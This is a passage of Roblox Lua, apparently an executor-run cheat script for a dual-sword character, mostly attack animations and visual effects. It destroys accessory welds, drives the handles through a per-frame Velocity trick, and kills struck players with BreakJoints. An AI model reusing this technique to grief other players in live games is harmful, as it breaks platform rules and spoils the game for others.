        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
		--                        hs(hit,1.2) 
		local c=Instance.new(""ObjectValue"")
		c.Name=""creator""
		c.Value=game:service(""Players"").LocalPlayer
		c.Parent=h
		game:GetService(""Debris""):AddItem(c,.5)
		local Damage=math.random(minim,maxim)
		--                h:TakeDamage(Damage)
		local  blocked=false
		local  block=hit.Parent:findFirstChild(""Block"")
		if block~=nil then
			print(block.className)
			if block.className==""NumberValue"" then
				if block.Value>0 then
					blocked=true
					if decreaseblock==nil then
						block.Value=block.Value-1
					end
				end
			end
			if block.className==""IntValue"" then
				if block.Value>0 then
					blocked=true
					if decreaseblock~=nil then
						block.Value=block.Value-1
					end
				end
			end
		end
		coroutine.resume(coroutine.create(function()
			h.Parent:BreakJoints()
			coroutine.resume(coroutine.create(function()
				local naeeym2 = Instance.new(""BillboardGui"",h.Parent)
				naeeym2.Size = UDim2.new(0,100,0,40)
				naeeym2.StudsOffset = Vector3.new(0,3,0)
				naeeym2.Adornee = h.Parent.Head
				naeeym2.Name = ""TalkingBillBoard""
				local tecks2 = Instance.new(""TextLabel"",naeeym2)
				tecks2.BackgroundTransparency = 1
				tecks2.BorderSizePixel = 0
				tecks2.Text = ""GIT SKITTL'D!11!""
				tecks2.Font = ""Fantasy""
				tecks2.FontSize = ""Size36""
				tecks2.TextStrokeTransparency = 0
				tecks2.TextColor3 = Color3.new(0,0,0)
				tecks2.TextStrokeColor3 = Color3.new(.6,0,1)
				tecks2.Size = UDim2.new(1,0,0.5,0)
				coroutine.resume(coroutine.create(function()
					while true do
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(1,i/256,0)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(1-i/256,1,0)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(0,1,i/256)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(0,1-i/256,1)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(i/256,0,1)
							swait()
						end
						for i = 0,256,16 do
							tecks2.TextStrokeColor3 = Color3.new(1,0,1-i/256)
							swait()
						end
					end
				end))
				swait(50)
				for i = 0,1,.05 do
					swait()
					tecks2.Position = tecks2.Position - UDim2.new(0,0,.005,0)
					tecks2.TextStrokeTransparency = i
					tecks2.TextTransparency = i
				end
				naeeym2:Destroy()
			end))
			local st = (CFrame.new(h.Parent.Head.CFrame * Vector3.new(0,-1.5,0))).p
			for oa = 1, 5 do
				local effp = Instance.new(""Part"",workspace)
				effp.CanCollide = false
				effp.BottomSurface = 0
				effp.TopSurface = 0
				effp.Size = Vector3.new(1,1,1)
				effp.Anchored = true
				effp.CFrame = (h.Parent.Head.CFrame * CFrame.new(0,-1.5,0)) * CFrame.fromEulerAnglesXYZ(math.rad(math.random(0,359)),math.rad(math.random(0,359)),math.rad(math.random(0,359)))
				effp.Material = ""Neon""
				effp.BrickColor = BrickColor.new(""White"")
				local efm = Instance.new(""SpecialMesh"",effp)
				efm.MeshType = ""Sphere""
				coroutine.resume(coroutine.create(function()
					for a = 0,1,.05 do
						efm.Scale = Vector3.new(2-a*2,100*a,2-a*2)
						effp.Transparency = a
						swait()
					end
					effp:Destroy()
				end))
			end
			for i, v in pairs(h.Parent:GetChildren()) do
				if v:IsA(""BasePart"") then
					v.Anchored = false
				end
			end
			for a, v in pairs(h.Parent:GetChildren()) do
				if v:IsA(""BasePart"") then
					local bodpos = Instance.new(""BodyPosition"",v)
					bodpos.Position = v.Position + Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
					v.BrickColor = BrickColor.new(""White"")
					v.Material = ""Neon""
				end
			end
			for d = 0,1,.05 do
				for i, v in pairs(h.Parent:GetChildren()) do
					if v:IsA(""BasePart"") then
						v.Transparency = d
						swait()
					end
				end
			end
			for i, v in pairs(h.Parent:GetChildren()) do
				if v:IsA(""BasePart"") then
					v:Destroy()
				end
			end
		end))
	end
end


function ShowDamage(Dude, Text, Time, Color)
	coroutine.resume(coroutine.create(function()
		local naeeym2 = Instance.new(""BillboardGui"",Dude)
		naeeym2.Size = UDim2.new(0,100,0,40)
		naeeym2.StudsOffset = Vector3.new(0,3,0)
		naeeym2.Adornee = Dude.Head
		naeeym2.Name = ""TalkingBillBoard""
		local tecks2 = Instance.new(""TextLabel"",naeeym2)
		tecks2.BackgroundTransparency = 1
		tecks2.BorderSizePixel = 0
		tecks2.Text = Text
		tecks2.Font = ""Fantasy""
		tecks2.TextSize = 24
		tecks2.TextStrokeTransparency = 0
		tecks2.TextColor3 = Color3.new(.8,0,1)
		tecks2.TextStrokeColor3 = Color3.new(0,0,0)
		tecks2.Size = UDim2.new(1,0,0.5,0)
		swait(10)
		for i = 0,1,.05 do
			swait()
			tecks2.Position = tecks2.Position - UDim2.new(0,0,.005,0)
			tecks2.TextStrokeTransparency = i
			tecks2.TextTransparency = i
		end
		naeeym2:Destroy()
	end))
end

Sword=Character[""VoidLordSword""]
SHandle = Sword.Handle
SHandle.AccessoryWeld:Destroy()
Equipped = false
h = Instance.new(""Attachment"",SHandle)
la = Instance.new(""Attachment"",LeftArm)
gap = Instance.new(""AlignPosition"",SHandle)
gap.Attachment0 = h
gap.Attachment1 = la
gap.RigidityEnabled = true
gao = Instance.new(""AlignOrientation"",SHandle)
gao.Attachment0 = h
gao.Attachment1 = la
gao.RigidityEnabled = true
SHandle:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = LeftArm.LeftGripAttachment
SHandle:FindFirstChildOfClass(""AlignPosition"").Attachment1 = LeftArm.LeftGripAttachment
LeftArm.LeftGripAttachment.Position = Vector3.new(0,-1.3,-3.5)
LeftArm.LeftGripAttachment.Orientation = Vector3.new(330, 180, 0)

Sword1=Character[""Evil Aura""]
SHandle1 = Sword1.Handle
SHandle1.AccessoryWeld:Destroy()
Equipped = false
h1 = Instance.new(""Attachment"",SHandle1)
ra = Instance.new(""Attachment"",RightArm)
gap1 = Instance.new(""AlignPosition"",SHandle1)
gap1.Attachment0 = h1
gap1.Attachment1 = ra
gap.RigidityEnabled = true
gao1 = Instance.new(""AlignOrientation"",SHandle1)
gao1.Attachment0 = h1
gao1.Attachment1 = ra
gao1.RigidityEnabled = true
SHandle1:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = RightArm.RightGripAttachment
SHandle1:FindFirstChildOfClass(""AlignPosition"").Attachment1 = RightArm.RightGripAttachment
RightArm.RightGripAttachment.Position = Vector3.new(0,-1,-2.3)
RightArm.RightGripAttachment.Orientation = Vector3.new(0, 90, 131)

game:GetService(""RunService"").Heartbeat:connect(function()
  SHandle.Velocity = Vector3.new(30,0,0)
  SHandle1.Velocity = Vector3.new(30,0,0)
end)

handle=SHandle
handleweld=weld(handle,Character[""Right Arm""],handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.00324273, 0.013961792, -0.00828075409, -1.38366803e-013, -0.999999881, 4.25688995e-009, 2.4656245e-007, -4.25688951e-009, -1, 1, -1.373172e-013, 2.4656245e-007))
Hitbox=SHandle
Hitboxweld=weld(m,handle,Hitbox,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000308990479, -5.48094559, -2.00271606e-005, 1, 6.10120843e-011, -1.08637464e-014, -6.10120843e-011, 1, 7.57154339e-011, 1.08637574e-014, -7.57154339e-011, 1))

handle2=SHandle1
handle2weld=weld(handle2,Character[""Left Arm""],handle2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.00324273, 0.013961792, -0.00828075409, -1.38366803e-013, -0.999999881, 4.25688995e-009, 2.4656245e-007, -4.25688951e-009, -1, 1, -1.373172e-013, 2.4656245e-007))
Hitbox2=SHandle1
Hitbox2weld=weld(m2,handle2,Hitbox2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000308990479, -5.48094559, -2.00271606e-005, 1, 6.10120843e-011, -1.08637464e-014, -6.10120843e-011, 1, 7.57154339e-011, 1.08637574e-014, -7.57154339e-011, 1))

local Lite = it(""PointLight"",Torso)
Lite.Color = Color3.new(.7,0,1)
Lite.Range = 8
Lite.Brightness = 10
Lite.Shadows = true

musid = ""rbxassetid://1074563286""
local mus = Instance.new(""Sound"",Character)
mus.Name = ""mus""
mus.SoundId = musid
mus.Looped = true
mus.Volume = 4
mus:Play()

function BreakEffect(brickcolor,cframe,x1,y1,z1)
	local prt=part(""Custom"",effs,""Neon"",0,0,""White"",""Effect"",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
	local msh=mesh(""SpecialMesh"",prt,""Sphere"","""",vt(0,0,0),vt(x1,y1,z1))
	coroutine.resume(coroutine.create(function(Part,CF,Numbb,randnumb) 
		CF=Part.CFrame
		Numbb=0
		randnumb=math.random()-math.random()
		for i=0,1,0.05 do
			swait()
			CF=CF*cf(0,1,0)
			--Part.CFrame=Part.CFrame*euler(0.5,0,0)*cf(0,1,0)
			Part.CFrame=CF*euler(Numbb,0,0)
			Part.Transparency=i
			Numbb=Numbb+randnumb
		end
		Part.Parent=nil
	end),prt)
end
--BreakEffect(BrickColor.new(""New Yeller""),Hitbox.CFrame,0.5,math.random(5,20),0.5)

neons = {}
for i, v in pairs(Character:GetDescendants()) do
	if v:IsA(""BasePart"") and (v.Parent == m or v.Parent == m2) and v.BrickColor == BrickColor.new(""White"") then
		table.insert(neons,v)
		v.Material = ""Neon""
	end
end


colrr = Color3.new()
maincol = Color3.new()

function attackone()
	attack=true
	for i=0,1,0.1 do
		swait()
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(120),math.rad(0),math.rad(20)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-90)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-50),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(120),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,.4)*angles(math.rad(70),math.rad(-10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
		handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
	end
	for i=0,1,0.1 do
		swait()
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(110),math.rad(-90),math.rad(20)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-120),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-60),math.rad(-10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
	end
	attack=false
	scfr = nil
	--tr1.Enabled = false
end

function attacktwo()
	attack=true
	for i=0,1,0.1 do
		swait()
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(90)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-30),math.rad(-10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
	end
	for i=0,1,0.1 do
		swait()
		--local blcf = Hitbox.CFrame*CFrame.new(0,.3,0)
		--if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
		--local h = 5
		--local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
		--if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
		--local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
		--if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
		--scfr = blcf
		--elseif not scfr then
		--scfr = blcf
		--end
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(-50),math.rad(90)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-90)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-50),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(130),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-50),math.rad(10),math.rad(0)),.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
	end
	attack=false
	scfr = nil
end

function attack2one()
	attack=true
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
		RW.C0 = clerp(RW.C0,CFrame.new(1.40839815, 0.633968949, 0.140340954, 0.766044259, -0.642787933, 7.74860382e-07, 0.492404878, 0.586824119, -0.64278686, 0.413175166, 0.492403537, 0.766045213),0.3)
		LW.C0 = clerp(LW.C0,CFrame.new(-1.35310566, 0.284592211, 0.109513491, 0.178405479, 0.982817411, 0.0473444164, 0.969994664, -0.167593122, -0.176132992, -0.165171936, 0.0773468912, -0.983227134),0.3)
		handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.511685491, -0.327819645, -0.209367245, 0.754512787, -0.544126034, 0.366929621, 0.564744711, 0.823128462, 0.0593538433, -0.334326208, 0.162438288, 0.92835319),0.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
	end
	for i=0,1,0.1 do
		swait()
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RW.C0 = clerp(RW.C0,CFrame.new(1.40839434, 0.633969903, 0.140334338, 0.766044557, -0.642787576, 1.93715096e-06, 0.492405057, 0.586823642, -0.642787158, 0.41317451, 0.49240455, 0.766044974),0.3)
		LW.C0 = clerp(LW.C0,CFrame.new(-1.31502986, 0.279656291, -0.555327773, 0.691364348, -0.713763416, 0.11205925, 0.35895291, 0.204722002, -0.910627127, 0.627031207, 0.669799149, 0.397744954),0.3)
		handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.425278902, -0.679693937, -0.729468644, 0.728087127, -0.518560231, 0.448312759, -0.252376348, 0.405284405, 0.878664255, -0.637334585, -0.752887487, 0.164210081),0.3)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
	end
	attack=false
	scfr = nil
	--tr2.Enabled = false
end

function Stab()
	attack=true
	for i=0,1,0.05 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-50),math.rad(0),math.rad(0)),.1)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
		RW.C0=clerp(RW.C0,cf(1.2,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.1)
		LW.C0=clerp(LW.C0,cf(-1.2,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.1)
		LH.C0=clerp(LH.C0,cf(-1,-.9,0)*angles(math.rad(-50),math.rad(-60),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-.9,0)*angles(math.rad(-50),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
		handle2weld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
	end
	for i=0,1,0.1 do
		swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.4)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.4)
		RW.C0=clerp(RW.C0,cf(1.2,0.5,0)*angles(math.rad(20),math.rad(100),math.rad(90)),.3)
		LW.C0=clerp(LW.C0,cf(-1.2,0.5,0)*angles(math.rad(20),math.rad(-100),math.rad(-90)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-.9,0)*angles(math.rad(0),math.rad(-60),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-.9,0)*angles(math.rad(40),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
		handle2weld.C0=clerp(handleweld.C0,cf(0,-1,1)*angles(math.rad(-270),math.rad(180),math.rad(0)),.4)
	end
	swait(5)
	swait(20)
	attack=false
	scfr = nil
end

function Spin()
	attack=true
	for i=0,1,1 do
		swait()
		for i=0,1,0.1 do
			swait()
			RW.C0=clerp(RW.C0,cf(1,0.5,-.5)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
			LW.C0=clerp(LW.C0,cf(-1,0.5,-.5)*angles(math.rad(90),math.rad(0),math.rad(0)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-.5,-1)*angles(math.rad(-20),math.rad(-90),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-.5,-1)*angles(math.rad(-20),math.rad(90),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,5)*euler(6*i,0,0),.5)
			handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),1)
			handle2weld.C0=clerp(handle2weld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),1)
		end
	end
	attack=false
	scfr = nil
	--tr1.Enabled = false
	--tr2.Enabled = false
end

function ContAttack()
	attack=true
	
	for i=1,4 do
		swait()
		for i=0,1,0.2 do
			swait()
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(120),math.rad(0),math.rad(20)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-90)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-50),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(120),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			handleweld.C0=clerp(handleweld.C0,cf(0,-0,.4)*angles(math.rad(70),math.rad(-10),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(110),math.rad(-90),math.rad(20)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-120),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-60),math.rad(-10),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(90)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(-20),math.rad(-50)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(-30),math.rad(-10),math.rad(0)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(70)),.3)
			RW.C0 = clerp(RW.C0,CFrame.new(1.40839815, 0.633968949, 0.140340954, 0.766044259, -0.642787933, 7.74860382e-07, 0.492404878, 0.586824119, -0.64278686, 0.413175166, 0.492403537, 0.766045213),0.3)
			LW.C0 = clerp(LW.C0,CFrame.new(-1.35310566, 0.284592211, 0.109513491, 0.178405479, 0.982817411, 0.0473444164, 0.969994664, -0.167593122, -0.176132992, -0.165171936, 0.0773468912, -0.983227134),0.3)
			handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.511685491, -0.327819645, -0.209367245, 0.754512787, -0.544126034, 0.366929621, 0.564744711, 0.823128462, 0.0593538433, -0.334326208, 0.162438288, 0.92835319),0.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(-50)),.3)
		end
		for i=0,1,0.2 do
			swait()
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-130),math.rad(5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(50),math.rad(10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
			RW.C0 = clerp(RW.C0,CFrame.new(1.40839434, 0.633969903, 0.140334338, 0.766044557, -0.642787576, 1.93715096e-06, 0.492405057, 0.586823642, -0.642787158, 0.41317451, 0.49240455, 0.766044974),0.3)
			LW.C0 = clerp(LW.C0,CFrame.new(-1.31502986, 0.279656291, -0.555327773, 0.691364348, -0.713763416, 0.11205925, 0.35895291, 0.204722002, -0.910627127, 0.627031207, 0.669799149, 0.397744954),0.3)
			handle2weld.C0 = clerp(handle2weld.C0,CFrame.new(-0.425278902, -0.679693937, -0.729468644, 0.728087127, -0.518560231, 0.448312759, -0.252376348, 0.405284405, 0.878664255, -0.637334585, -0.752887487, 0.164210081),0.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
			Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(50)),.3)
		end
	end
	attack=false
	scfr = nil
	--tr1.Enabled = false
	--tr2.Enabled = false
end


function Sheathe()
	attack = true
	CurrentMode = ""Sheathed""
	for i = 0,1,0.1 do
		swait()
		handleweld.Part0 = Torso
		handle2weld.Part0 = Torso
		SHandle:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = Torso.BodyFrontAttachment
		SHandle:FindFirstChildOfClass(""AlignPosition"").Attachment1 = Torso.BodyFrontAttachment
		Torso.BodyFrontAttachment.Orientation = Vector3.new(0,0,90)
		Torso.BodyFrontAttachment.Position = Vector3.new(0,0,.5)
		SHandle1:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = Torso.BodyBackAttachment
		SHandle1:FindFirstChildOfClass(""AlignPosition"").Attachment1 = Torso.BodyBackAttachment
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(-20)),.3)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(190),math.rad(0),math.rad(0)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-190),math.rad(0),math.rad(-0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
		handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
	end
	attack = false
end

function Unsheathe()
	attack = true
	CurrentMode = ""Unsheathed""
	for i = 0,1,0.1 do
		swait()
		handleweld.Part0 = RightArm
		handle2weld.Part0 = LeftArm
		SHandle:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = LeftArm.LeftGripAttachment
		SHandle:FindFirstChildOfClass(""AlignPosition"").Attachment1 = LeftArm.LeftGripAttachment
		LeftArm.LeftGripAttachment.Position = Vector3.new(0,-1,-2.3)
		LeftArm.LeftGripAttachment.Orientation = Vector3.new(0, 90, 140)
		SHandle1:FindFirstChildOfClass(""AlignOrientation"").Attachment1 = RightArm.RightGripAttachment
		SHandle1:FindFirstChildOfClass(""AlignPosition"").Attachment1 = RightArm.RightGripAttachment
		RightArm.RightGripAttachment.Position = Vector3.new(0,-1,-2.3)
		RightArm.RightGripAttachment.Orientation = Vector3.new(0, 90, 131)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(60)),.3)
